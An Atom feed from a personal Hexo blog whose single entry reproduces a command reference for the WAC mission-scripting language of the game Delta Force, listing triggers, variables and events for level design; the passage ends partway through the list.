<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>BangZ&#39;s 梦工厂</title>
  
  <subtitle>FutureTech Research Center</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://hexo.bangz.me/"/>
  <updated>2022-12-22T04:13:36.670Z</updated>
  <id>https://hexo.bangz.me/</id>
  
  <author>
    <name>BangZ</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>三角洲特种部队 WAC 脚本帮助</title>
    <link href="https://hexo.bangz.me/archives/novalogic-wac-script-api-reference.html"/>
    <id>https://hexo.bangz.me/archives/novalogic-wac-script-api-reference.html</id>
    <published>2022-12-22T03:58:29.000Z</published>
    <updated>2022-12-22T04:13:36.670Z</updated>
    
    <content type="html"><![CDATA[<p><br><br>///////////////////WAC HELP 1（MED）///////////////////<br><br><br><br>;wac file - nestable IF/THEN/ELSE/ENDIF boolean logic<br><br>;<br><br>;WAC post directory w:\vp\program\wac - commands listed in GAME.WAC<br><br>;WAC debug screen under shift-F12, numlock arrows to select and scroll<br><br>;<br><br>;GLOBAL WAC is GAME.WAC (executed first)<br><br>;<br><br>;MISSION WAC is misname.WAC (executed second)<br><br>;<br><br>;Left to Right order of operations<br><br>;<br><br><a id="more"></a><br>;—WAC LANGUAGE COMMANDS<br><br>;nestable flow control<br><br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IF THEN ELSE ENDIF<br><br>;boolean logic<br><br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; AND OR XOR<br><br>;function modifier<br><br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NOT<br><br>;comments<br><br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; /<br><br>;<br><br>;Syntax - parens optional, line returns and tabbing optional<br><br>;<br><br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if trigger1(params) and trigger2(params) then<br><br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; event1(params)<br><br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; event2(params)<br><br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; endif<br><br>;<br><br>;Example<br><br>;<br><br>;&nbsp;&nbsp; I want to open doors in group 12 the first time I enter area 1501<br><br>;<br><br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if location(1501) and never() then<br><br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; opendoors(12)<br><br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; endif<br><br>;<br><br><br><br>;—VARIABLES &amp; IMMEDIATES (a variable can always be used as an immediate)<br><br>;”STRING”&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; immediate string value<br><br>;#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; immediate decimal number<br><br>;anim_move&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; immediate equate from ADM file<br><br>;ammo_name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; immediate ammo name (ex. ammo2tgt ammo_rocket 1)<br><br>;fx_fxname&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; immediate effect name (ex. fxrain fx_effect_lightning)<br><br>;effect_name&nbsp;&nbsp;&nbsp; immediate effect name (ex. fxrain effect_lightning)<br><br>;SS_SoundSet&nbsp;&nbsp;&nbsp; immediate soundset name<br><br>;sSoundSet&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; immediate soundset name (alternate syntax)<br><br>;face_name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; immediate face name (ex. ssnface 45 face_happy)<br><br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; face_normal<br><br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; face_happy<br><br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; face_sad<br><br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; face_smirk<br><br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; face_angry<br><br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; face_surprise<br><br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; face_disgust<br><br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; face_fear<br><br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; face_aggressive<br><br>;<br><br>;V#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; V0 to v511 game variables, cleared at start of mission<br><br>;G#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; G0 to vG11 global variables, not cleared during link<br><br>;M#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Music Script Variable<br><br>;result&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; current return/accumulator value (mostly for debug)<br><br>;ticks&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; number of seconds into game<br><br>;GameOver&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true is game is over<br><br>;Win&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if blue team won<br><br>;Lose&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if red team won<br><br>;wind&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; used by SWING, FLICKER, and particle wind2<br><br>;health&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; player’s health/hp value<br><br>;mana&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; player’s mana<br><br>;neartype&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; the type of the nearest enemy (from items.def dialog)<br><br>;neardist&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; the distance to the nearest organic<br><br>;nearmove&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; the anim move of the nearest organic (setable)<br><br>;nearid&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; the unique dcb/id of the nearest organic<br><br>;neartid&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; the id of the organic’s target or 0 if no target<br><br>;nearblind<br><br>;nearflying<br><br>;nearguard<br><br>;nearSSN<br><br>;nearWP<br><br>;nearGroup<br><br>;nearHP<br><br><br><br>;deadDist&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; the nearest corpse info<br><br>;DdeadType<br><br>;ddeadSSN<br><br>;DdeadMove<br><br>;DdeadGroup<br><br><br><br>;bbadDist&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; the nearest badguy info (team 2)<br><br>;bbadType<br><br>;bbadSSN<br><br>;bbadMove<br><br>;bbadGroup<br><br><br><br><br><br><br><br><br><br>;—TRIGGERS (# param can be number or variable)<br><br>;never()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if current IF has never fired, for one time only events<br><br>;elapse(#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if past # seconds since current IF activated<br><br>;<br><br>;-IF Link (these commands fire once only for every fire of linked IF)<br><br>;previous&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if previous (same nesting level) IF fired<br><br>;chain(#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if previous (same nesting level) IF fired # seconds ago<br><br>;link(#1,#2)&nbsp;&nbsp;&nbsp; true if IF #1 away from current IF fired #2 seconds ago<br><br>;<br><br>;-Game Time (seconds of WAC script running)<br><br>;past(#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if past # seconds into game, keeps firing after #<br><br>;before(#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if before # seconds into game.&nbsp; keeps firing before #<br><br>;ontick(#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if ontick #, only fires once<br><br>;<br><br>;random(#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; randomly true 1 in # times, sets RND for additional tests<br><br>;location(#)&nbsp;&nbsp;&nbsp; true if you are at that music location<br><br>;area(#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if within MED area without checking vertical<br><br>;area3D(#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if within MED 3D area<br><br>;outside()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if you are not in a blink box<br><br>;waveready()&nbsp;&nbsp;&nbsp; true if no talking going on<br><br>;groupdead(#)&nbsp;&nbsp; true if entire group is dead<br><br>;groupalive(#)&nbsp; true if anyone in group is alive<br><br>;ssnwounded(#)&nbsp; true if ssn is wounded<br><br>;ssndead(#)&nbsp;&nbsp;&nbsp;&nbsp; true if ssn is dead<br><br>;ssnalive(#)&nbsp;&nbsp;&nbsp; true if ssn is alive<br><br>;ssnride(#)&nbsp;&nbsp;&nbsp;&nbsp; true if any organic is standing on SSN<br><br>;ssnonssn&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if SSN is standing on SSN<br><br>;ssnnearssn&nbsp;&nbsp;&nbsp;&nbsp; true if SSN is near SSN within dist<br><br>;ssnlosssn&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if SSN is near SSN within dist and has LOS<br><br>;ssnseesssn&nbsp;&nbsp;&nbsp;&nbsp; true if SSN is near SSN within dist and can see it<br><br>;meride(#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if player is standing on SSN<br><br>;meattached(#)&nbsp; true if player is attached to SSN<br><br>;medrive(#)&nbsp;&nbsp;&nbsp;&nbsp; true if player is driving SSN<br><br>;meongun(#)&nbsp;&nbsp;&nbsp;&nbsp; true if player is on emplaced weapon on SSN<br><br>;ssnloc(#,#)&nbsp;&nbsp;&nbsp; true if vehicle or person is in music location<br><br>;ssnarea(#,#)&nbsp;&nbsp; true if vehicle or person is in 2D med area #<br><br>;ssnarea3D(#,#) true if vehicle or person is in 3D med area #<br><br>;dooropen(#)&nbsp;&nbsp;&nbsp; true if group # has door open<br><br>;event(#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if med event has triggered<br><br>;squadevent(#)&nbsp; true if squad event is in que, sets squadSSN to talker<br><br>;playerfired(#) true if player has pressed fire and has slot # selected<br><br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1=knife, 2=small arm, 3=main weapon, ect..<br><br>;<br><br>;—VARIABLE COMPARE<br><br>;eq(#,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if #==#<br><br>;ne(#,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if #!=#<br><br>;lt(#,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if #&lt;#<br><br>;gt(#,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if #&gt;#<br><br>;le(#,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if #&lt;=#<br><br>;ge(#,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if #&gt;=#<br><br>;true(#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if #!=0<br><br>;false(#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; true if #==0<br><br>;<br><br>;—VARIABLE MODIFY<br><br>;set(var,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set var to #<br><br>;add(var,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add # to var<br><br>;sub(var,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; subtract # from var, clamp at 0<br><br>;inc(var)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add 1 to var<br><br>;dec(var)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; subtract 1 from var, clamp at 0<br><br><br><br>;—EVENTS (# param can be number or variable)<br><br>;squadclear&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; clears squadevent selected by squadevent(#)<br><br>;forceanim(anim)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; forces all organics into anim slot (debug only)<br><br>;report(“text”)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop-up debug report window<br><br>;report#(“text”,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop-up debug report window with number<br><br>;text(“text”)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; output text to chat - right side<br><br>;text#(“text”,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; output text to chat w/# - right side<br><br>;consol(“text”)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; output text to consol - left side<br><br>;consol#(“text”,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; output text to consol w/# - left side<br><br>;<br><br>;flash&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; produce a flash of lightning &amp; thunder<br><br>;farflash&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; produce a far away flash of lightning &amp; thunder<br><br>;quake(#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; earthquake for # 10th of a seconds<br><br>;<br><br>;colorfade(#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; seconds for color to transition (zero is normal)<br><br>;sun(#,#,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sets sun rgb&nbsp;&nbsp;&nbsp; ENV override<br><br>;sky(#,#,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sets sky rgb<br><br>;ground(#,#,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sets ground rgb<br><br>;ceiling(#,#,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sets ceiling rgb<br><br>;floor(#,#,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sets floor rgb (inside ground)<br><br>;lightning(#,#,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sets the color of the lightning<br><br>;cloud(#,#,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sets the cloud color<br><br>;gain(#,#,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sets the brightness of the whole scene<br><br>;<br><br>;fogcolor(#,#,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set fogcolor to R,G,B, changes at color fade rate<br><br>;fog(#,#,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; same as fogcolor<br><br>;skyfogcolor(#,#,#)&nbsp;&nbsp;&nbsp;&nbsp; set skyfogcolor to R,G,B<br><br>;skyfog(#,#,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; same as skyfogcolor<br><br>;fogtype(#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set fog type 0=fog, 1=haze, 2=haze wall, 3=fog wall<br><br>;fogdist(#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sets fogdist to # meters<br><br>;movefog(#,#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; move fogdist to # meters over # seconds<br><br>;skyspeed(#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sets the sky movement speed<br><br>;skyheight(#)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sets the height of the sky<br><br>;<br><br>;sound(sSSNAME, dist, head)&nbsp; plays soundset at distance(meters) and heading(bangle)<br><br>;<br><br>;nearwave(“wave.wav”, dist) plays wave file from the mouth of the nearest enemy with max dist to be heard<br><br>;nearanim(anim_move)&nbsp;&nbsp;&nbsp; sets the nearest enemy to ADM move slot<br><br>;<br><br>;SSNwave(ssn, “wave.wav”, dist) plays wave file from the mouth of the ssn with max dist to be heard<br><br>;wave(“wave.wav”, dist) plays wave file from mouth of player<br><br>;SSNanim(ssn, anim_move)&nbsp;&nbsp;&nbsp; sets the ssn to ADM move slot<br><br>;SSNradio(ssn, “wave.wav”)&nbsp; sets the ssn to talk on radio<br><br>;<br><br>;SSNmax(ssn, maxengage) set max engage distance<br><br>;SSNmin(ssn, minengage) set min engage distance<br><br>;SSNatt(ssn, maxattack) set max attack distance<br><br>;SSNSpawn(ssn, spawn count) set the spawn count, 0=don’t respawn<br><br>;GroupMax(group, maxengage) set max engage distance<br><br>;GroupMin(group, minengage) set min engage distance<br><br>;GroupAtt(group, maxattack) set max attack distance<br><br>;GroupSpawn(group, spawn count) set the spawn count, 0=don’t respawn<br><br>;remove(grp)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; remove group # without a trace<br><br>;kill(grp)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kill group #<br><br>;removeSSN(ssn)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; remove SSN # without a trace<br><br>;killSSN(ssn)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kill SSN #<br><br>;teleport(grp,tgt)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; teleport group # to target #<br><br>;telessn(ssn, tgt)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; teleport SSN # to target #<br><br>;targetfx(tgt)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; create med particle fx at target #<br><br>;sound2tgt(ss,tgt)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; create ssoundset at target # (ex. sound2tgt sSoundSet 1)<br><br>;ss2ssn(ss,ssn)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; create ssoundset at center of ssn<br><br>;ammo2tgt(ammo,tgt)&nbsp;&nbsp;&nbsp;&nbsp; create ammo # at target # (ex. ammo2tgt ammo_rocket 1)<br><br>;fx2tgt(fx,tgt)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; create fx # at target # (ex. fx2tgt effect_lightning 1)<br><br>;opendoors(group)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; open doors in group #<br><br>;closedoors(group)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close doors in group #<br><br>;SSNtoWP(ssn, wp)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; redirect SSN to WP list<br><br>;GtoWP(group, wp)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; redirect Group to WP list<br><br>;ammorain(ammo)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rain down ammo # somewhere near player<br><br>;ammoarea(ammo, area)&nbsp;&nbsp; rain down ammo # somewhere inside area #<br><br>;fxrain(fx)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rain down effect # somewhere near player<br><br>;ssncspd(ssn,speed)&nbsp;&nbsp;&nbsp;&nbsp; set ssn to combat speed of #<br><br>;ssnpspd(ssn,speed)&nbsp;&nbsp;&nbsp;&nbsp; set ssn to patrol speed of #<br><br>;ssnuse(ssn)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; snap ssn to emplaced weapon if within 3 meters<br><br>;ssnrelease(ssn)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; remove ssn from emplaced weapon<br><br>;ssn2ssn(ssn, ssn)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; have ssn goto ssn and try to snap to emplaced<br><br>;ssnface(ssn, face)&nbsp;&nbsp;&nbsp;&nbsp; set face expression of ssn<br><br>;ssnguard(ssn, #)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set ssn to guard 1=ON, 0=Off<br><br>;ssnturn(ssn, heading)&nbsp; turn ssn to heading 0-360<br><br>;ssnhp(ssn, hp)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set ssn’s hitpoints to hp<br><br>;blockfire(wpnkey, #)&nbsp;&nbsp; blockfiring of weapons under key, 0=fire, 1=block<br><br><br><br>///////////////////WAC HELP 2（NILE）///////////////////<br><br><br><br>//PLOOP -&gt; Real Player loop<br><br><br><br>//- PLOOP actions(player) END<br><br><br><br>//CODEPLOOP<br><br>//if condition<br><br>//actions(player)<br><br>//end condition<br><br>//END<br><br><br><br><br><br>//—————————————————<br><br><br><br>//GLOOP -&gt; Named Group Loop<br><br><br><br>//don’t use group commands !<br><br><br><br>//- GLOOP group actions(item) END<br><br><br><br>//CODEGLOOP group<br><br>//if condition<br><br>//actions(item)<br><br>//end condition<br><br>//END<br><br><br><br><br><br>//——————————————————<br><br><br><br>//ENTER -&gt; to handle like ‘and never()’, but fire again was con. false<br><br><br><br>//CODEIF trigger ENTER // triggers on first true<br><br>//actions<br><br>//ENDIF<br><br><br><br><br><br>//——————————————————<br><br><br><br>//LEAVE -&gt; fired if condition no more true<br><br><br><br>//CODEIF trigger LEAVE // triggers after last true<br><br>//actions<br><br>//ENDIF<br><br><br><br><br><br>//——————————————————-<br><br><br><br>//IFNAME -&gt; give a condition a Name<br><br><br><br><br><br>//CODEIF [ifname] triggers THEN // optional named if<br><br>//actions<br><br>//ENDIF<br><br><br><br><br><br>//———————————————————<br><br><br><br>// WAC Quick Reference Help File<br><br><br><br>//WAC Flow Control (basic statements)<br><br>// IF triggers THEN actions END<br><br>// IF [ifname] triggers THEN actions END (optional named if)<br><br>// IF triggers THEN actions ELSE actions END<br><br>// IF triggers THEN actions ELSEIF triggers THEN actions END<br><br>// PLOOP actions(player) END<br><br>// GLOOP group actions(item) END<br><br>// DOSEQ actions NEXT actions [NEXT actions..] END<br><br>// DORND actions NEXT actions [NEXT actions..] END<br><br>// IF triggers ENTER actions END (triggers on first true)<br><br>// IF triggers LEAVE actions END (triggers after last true)<br><br><br><br>// WAC Compiler Commands<br><br>// VAR variablename (declares a number variable, shows up on debug screen)<br><br>// CHEAT cheatname (declares a server cheat variable, shows up on debug screen)<br><br>// RUN filename (this includes the text from a file, good from command line)<br><br><br><br>// WAC Logic and Math (tests for inside IF statement)<br><br>// Arithmatics ()+-<em>/^<br><br>// Booleans AND OR NOT &lt; &gt; &lt;= &gt;= == !=<br><br>// Example: IF V1&lt;12 THEN<br><br>// Example: IF V1&lt;12 AND V2&lt;12 THEN<br><br>// Note: this compiles to IF (V1&lt;12) AND (V2&lt;12) THEN<br><br><br><br>// WAC Assignment Var = Value<br><br>// Example: V1 = 12<br><br>// Example: V2 = V2+V3</em>4<br><br>// Note: This compiles to V2+(V3*4)<br><br><br><br>// WAC Triggers (Things to do after IF statement)<br><br><br><br>// elapse (seconds)<br><br>// never ()<br><br>// previous ()<br><br>// chain (seconds)<br><br>// past (seconds)<br><br>// before (seconds)<br><br>// ontick (seconds)<br><br>// groupdead (number)<br><br>// groupalive (number)<br><br>// dooropen (number)<br><br>// SSNcritical (ssn)<br><br>// SSNexists (ssn)<br><br>// SSNdead (ssn)<br><br>// SSNalive (ssn)<br><br>// SSNwounded (ssn)<br><br>// SSNride (ssn)<br><br>// SSNonSSN (ssn, ssn)<br><br>// SSNnearSSN (ssn, ssn, distance)<br><br>// SSNlosSSN (ssn, ssn, distance)<br><br>// SSNseesSSN (ssn, ssn, distance)<br><br>// SSNarea (ssn, area)<br><br>// SSNarea3D (ssn, area)<br><br>// SSNloc (ssn, number)<br><br>// SSNLeadSSN2SSN (ssn, ssn, ssn, distance)<br><br><br><br>// WAC Actions (Things to do after THEN/ENTER/LEAVE statement)<br><br><br><br>// reset (ifname)<br><br>// Gkill (group)<br><br>// Gremove (group)<br><br>// Gsetaccuracy (number, number, number)<br><br>// GtoWP (number, wplist)<br><br>// kill (number)<br><br>// remove (number)<br><br>// teleport (number, target)<br><br>// GroupMin (number, distance)<br><br>// GroupMax (number, distance)<br><br>// GroupAtt (number, distance)<br><br>// GroupSpawn (number, number)<br><br>// GroupHP (number, number)<br><br>// opendoors (number)<br><br>// closedoors (number)<br><br>// text (text)<br><br>// wave (filename)<br><br>// hideSSN (ssn)<br><br>// unhideSSN (ssn)<br><br>// disableSSN (ssn)<br><br>// enableSSN (ssn)<br><br>// holdSSN (ssn)<br><br>// unholdSSN (ssn)<br><br>// setaccuracy (ssn, number, number)<br><br>// SSNtoWP (ssn, wplist)<br><br>// killSSN 